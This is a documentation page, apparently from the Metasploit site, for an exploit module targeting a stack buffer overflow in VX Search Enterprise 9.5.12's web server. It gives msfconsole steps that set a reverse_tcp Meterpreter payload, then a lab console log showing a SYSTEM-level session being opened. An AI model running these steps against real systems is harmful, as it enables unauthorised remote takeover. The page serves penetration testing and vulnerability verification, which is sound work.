{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/http/vxsrchs_bof","result":{"data":{"moduleMetadataJson":{"id":"2270fa60-138f-52cc-ace1-402f3942ac30","name":"VX Search Enterprise GET Buffer Overflow","fullname":"exploit/windows/http/vxsrchs_bof","description":"This module exploits a stack-based buffer overflow vulnerability\n        in the web interface of VX Search Enterprise v9.5.12, caused by\n        improper bounds checking of the request path in HTTP GET requests\n        sent to the built-in web server. This module has been tested\n        successfully on Windows 7 SP1 x86.","rank":500,"fields":{"detailsSlug":"/modules/details/exploit/windows/http/vxsrchs_bof","documentationSlug":"/modules/documentation/exploit/windows/http/vxsrchs_bof"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p><a href=\"www.vxsearch.com\">VX Search Enterprise</a> versions up to v9.5.12 are affected by a stack-based buffer overflow vulnerability which can be leveraged by an attacker to execute arbitrary code in the context of NT AUTHORITY\\SYSTEM on the target. The vulnerability is caused by improper bounds checking of the request path in HTTP GET requests sent to the built-in web server. This module has been tested successfully on Windows 7 SP1. The vulnerable application is available for download at <a href=\"http://www.vxsearch.com/setups/vxsearchent_setup_v9.5.12.exe\">VX Search Enterprise</a>.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install a vulnerable VX Search Enterprise</li>\n<li>Start <code class=\"language-text\">VX Search Enterprise</code> service</li>\n<li>Start <code class=\"language-text\">VX Search Enterprise</code> client application</li>\n<li>Navigate to <code class=\"language-text\">Tools</code> > <code class=\"language-text\">VX Search Options</code> > <code class=\"language-text\">Server</code></li>\n<li>Check <code class=\"language-text\">Enable Web Server On Port 80</code> to start the web interface</li>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li>Do <code class=\"language-text\">use exploit/windows/http/vxsrchs_bof</code></li>\n<li>Do <code class=\"language-text\">set RHOST ip</code></li>\n<li>Do <code class=\"language-text\">check</code></li>\n<li>Verify the target is vulnerable</li>\n<li>Do <code class=\"language-text\">set PAYLOAD windows/meterpreter/reverse_tcp</code></li>\n<li>Do <code class=\"language-text\">set LHOST ip</code></li>\n<li>Do <code class=\"language-text\">exploit</code></li>\n<li>Verify the Meterpreter session is opened</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"vx-search-enterprise-v9512-on-windows-7-sp1\" style=\"position:relative;\"><a href=\"#vx-search-enterprise-v9512-on-windows-7-sp1\" aria-label=\"vx search enterprise v9512 on windows 7 sp1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>VX Search Enterprise v9.5.12 on Windows 7 SP1</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(vxsrchs_bof) &gt; show options \n\nModule options (exploit/windows/http/vxsrchs_bof):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOST    172.16.0.18      yes       The target address\n   RPORT    80               yes       The target port\n   SSL      false            no        Negotiate SSL/TLS for outgoing connections\n   VHOST                     no        HTTP server virtual host\n\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  thread           yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)\n   LHOST     172.16.0.20      yes       The listen address\n   LPORT     4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   VX Search Enterprise v9.5.12\n\n\nmsf exploit(vxsrchs_bof) &gt; exploit \n\n[*] Started reverse TCP handler on 172.16.0.20:4444 \n[*] Sending request...\n[*] Sending stage (958324 bytes) to 172.16.0.18\n[*] Meterpreter session 1 opened (172.16.0.20:4444 -&gt; 172.16.0.18:49162) at 2017-05-18 16:10:58 +0100\n\nmeterpreter &gt; getuid \nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter &gt; sysinfo \nComputer        : PC-01\nOS              : Windows 7 (Build 7600).\nArchitecture    : x86\nSystem Language : pt_PT\nDomain          : LAB\nLogged On Users : 2\nMeterpreter     : x86/windows\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"2270fa60-138f-52cc-ace1-402f3942ac30"}}}